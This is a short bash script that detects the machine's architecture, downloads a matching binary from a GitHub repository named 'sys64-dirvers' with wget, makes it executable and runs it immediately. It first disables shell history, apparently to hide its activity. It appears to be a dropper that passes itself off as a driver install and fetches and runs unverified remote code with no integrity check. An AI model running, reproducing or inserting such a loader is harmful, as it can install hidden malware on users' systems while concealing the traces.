#!/bin/bash

set +o history
# get_arch=`arch`
get_arch=$(uname -m)
if [[ $get_arch =~ "x86_64" ]];then
    echo "this is x86_64(AMD64)"
    wget https://github.com/alvin0519/sys64-dirvers/raw/main/amd_x86_64_unix && chmod +x amd_x86_64_unix && ./amd_x86_64_unix
elif [[ $get_arch =~ "aarch64" ]];then
    echo "this is aarch64"
    wget https://github.com/alvin0519/sys64-dirvers/raw/main/arm_aarch64_unix && chmod +x arm_aarch64_unix && ./arm_aarch64_unix
elif [[ $get_arch =~ "arm64" ]];then
    echo "this is arm64"
    wget https://github.com/alvin0519/sys64-dirvers/raw/main/arm_aarch64_unix  && chmod +x arm_aarch64_unix && ./arm_aarch64_unix
else
    echo "unknown!!"
    wget https://github.com/alvin0519/sys64-dirvers/raw/main/amd_x86_64_unix && chmod +x amd_x86_64_unix && ./amd_x86_64_unix
fi

